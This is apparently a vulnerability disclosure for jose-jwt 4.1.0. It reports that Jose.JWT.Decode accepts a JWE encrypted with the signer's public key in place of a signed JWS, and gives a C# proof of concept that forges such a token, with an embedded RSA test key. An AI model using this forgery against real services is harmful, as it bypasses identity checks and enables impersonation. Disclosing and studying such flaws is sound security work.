# dvsekhvalnov/jose-jwt has a sign/encrypt confusion problem

## 0x01 Affected version

vendor: https://github.com/dvsekhvalnov/jose-jwt

version: 4.1.0

.NET version: 9

## 0x02 Vulnerability description

A privilege bypass vulnerability exists in `Jose.JWT.Decode` in `dvsekhvalnov/jose-jwt 4.1.0`, which could allow a user to bypass its identity checks under certain circumstances.

`Jose.JWT.Decode` will automatically detect whether the user inputs JWS or JWE. This means that if the attacker obtains the public key of JWS, he can forge a JWE Token to pass the verification.

The following code is an example of using JWE to bypass `Jose.JWT.Decode` here.

```c#
using System;
using System.Security.Cryptography.X509Certificates;
using Jose;

class Program
{
    static void Main()
    {
        var payload = new Dictionary<string, object>()
{
    { "sub", "mr.x@contoso.com" },
    { "exp", 1300819380 }
};

        Jwk Key = new Jwk(
            e: "AQAB",
            n: "qFZv0pea_jn5Mo4qEUmStuhlulso8n1inXbEotd_zTrQp9K0RK0hf7t0K4BjKVhaiqIam4tVVQvkmYeBeYr1MmnO_0N97dMBz_7fmvyv0hgHaBdQ5mR5u3LTlHo8tjRE7-GzZmGs6jMcyj7HbXobDPQJZpqNy6JjliDVXxW8nWJDetxGBlqmTj1E1fr2RCsZLreDOPSDIedG1upz9RraShsIDzeefOcKibcAaKeeVI3rkAU8_mOauLSXv37hlk0h6sStJb3qZQXyOUkVkjXIkhvNu_ve0v7LiLT4G_OxYGzpOQcCnimKdojzNP6GtVDaMPh-QkSJE32UCos9R3wI2Q",
            p: "0qaOkT174vRG3E_67gU3lgOgoT6L3pVHuu7wfrIEoxycPa5_mZVG54SgvQUofGUYEGjR0lavUAjClw9tOzcODHX8RAxkuDntAFntBxgRM-IzAy8QzeRl_cbhgVjBTAhBcxg-3VySv5GdxFyrQaIo8Oy_PPI1L4EFKZHmicBd3ts",
            q: "zJPqCDKqaJH9TAGfzt6b4aNt9fpirEcdpAF1bCedFfQmUZM0LG3rMtOAIhjEXgADt5GB8ZNK3BQl8BJyMmKs57oKmbVcODERCtPqjECXXsxH-az9nzxatPvcb7imFW8OlWslwr4IIRKdEjzEYs4syQJz7k2ktqOpYI5_UfYnw1s",
            d: "lJhwb0pKlB2ivyDFO6thajotClrMA3nxIiSkIUbvVr-TToFtha36gyF6w6e6YNXQXs4HhMRy1_b-nRQDk8G4_f5urd_q-pOn5u4KfmqN3Xw-lYD3ddi9qF0NLeTVUNVFASeP0FFqbPYfdNwD-LyvwjhtT_ggMOAw3mYvU5cBfz6-3uPdhl3CwQFCTgwOud_BA9p2MPMUHG82wMK_sNO1I0TYpjm7TnwNBwiKbMf-i5CKnuohgoYrEDYLeMg3f32eBljlCFNYaoCtT-mr1Ze0OTJND04vbfLotV-BBKulIpbOOSeVpKG7gJxZHmv7in7PE5_WzaxKFVoHW3wR6v_GzQ",
            dp: "KTWmTGmf092AA1euOmRQ5IsfIIxQ5qGDn-FgsRh4acSOGE8L7WrTrTU4EOJyciuA0qz-50xIDbs4_j5pWx1BJVTrnhBin9vNLrVo9mtR6jmFS0ko226kOUpwEVLgtdQjobWLjtiuaMW-_Iw4gKWNptxZ6T1lBD8UWHaPiEFW2-M",
            dq: "Jn0lqMkvemENEMG1eUw0c601wPOMoPD4SKTlnKWPTlQS6YISbNF5UKSuFLwoJa9HA8BifDrD-Mfpo1M1HPmnoilEWUrfwMqqdCkOlbiJQhKY8AZ16QGH50kDXhmVVa8BRWdVQWBTUzWXS5kXMaeskVzextTgymPcOAhXN-ph7MU",
            qi: "sRAPigJpl8S_vsf1zhJTrHM97xRwuB26R6Tm-J8sKRPb7p5xxNlmOBBFvWmWxdto8dBElNlydSZan373yBLxzW-bZgVp-B2RKT1B3WhTYW_Vo5DLhWi84XMncJxH7avtxtF9yksaeKe0e2n3J6TTan53mDg4KF8U0OEO2ciqO9g"
        );

        Jwk PubKey = new Jwk(
            e: "AQAB",
            n: "qFZv0pea_jn5Mo4qEUmStuhlulso8n1inXbEotd_zTrQp9K0RK0hf7t0K4BjKVhaiqIam4tVVQvkmYeBeYr1MmnO_0N97dMBz_7fmvyv0hgHaBdQ5mR5u3LTlHo8tjRE7-GzZmGs6jMcyj7HbXobDPQJZpqNy6JjliDVXxW8nWJDetxGBlqmTj1E1fr2RCsZLreDOPSDIedG1upz9RraShsIDzeefOcKibcAaKeeVI3rkAU8_mOauLSXv37hlk0h6sStJb3qZQXyOUkVkjXIkhvNu_ve0v7LiLT4G_OxYGzpOQcCnimKdojzNP6GtVDaMPh-QkSJE32UCos9R3wI2Q"
            );
        string token_jwe = Jose.JWT.Encode(payload, PubKey, JweAlgorithm.RSA_OAEP, JweEncryption.A256GCM);
        string token_jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJtci54QGNvbnRvc28uY29tIiwiZXhwIjoxMzAwODE5MzgwfQ.bsUx8i-4yETsg9VsvDJ69ADfLPm3JS-JL5L7q2_sEbyGVTlOiEfu9JT_sFdOcqS89phseRu_LjHqn2AbfCtVorLv1oOA15Rwj3qt8F6FUvvXlzsTJsYXo44KxdBfhrGrSUxGvcQ1dgvtsnpQet6HFlEl76QxVQVzmj0zd375L7DWLlzdV4IIXgL6OjIySdiYktIeeCiAITtaSvQOy009C_TPUP4mKLf2PhUXFvGi9VmSghgVok240zTjt_S9u3RwLoBYs273SkOHiCZ0VxlVG2YF6Rii5SCupsZEWnQmCcMEfgGKXEV8ysYPX8EA1sGvFZq2G6aOpaVFdh53CbmHfw";
        Console.WriteLine(Jose.JWT.Decode(token_jwe, Key, JwsAlgorithm.RS256));
        Console.WriteLine(Jose.JWT.Decode(token_jwt, Key, JwsAlgorithm.RS256));
    }
}
```

## 0x03 Acknowledgement

P3ngu1nW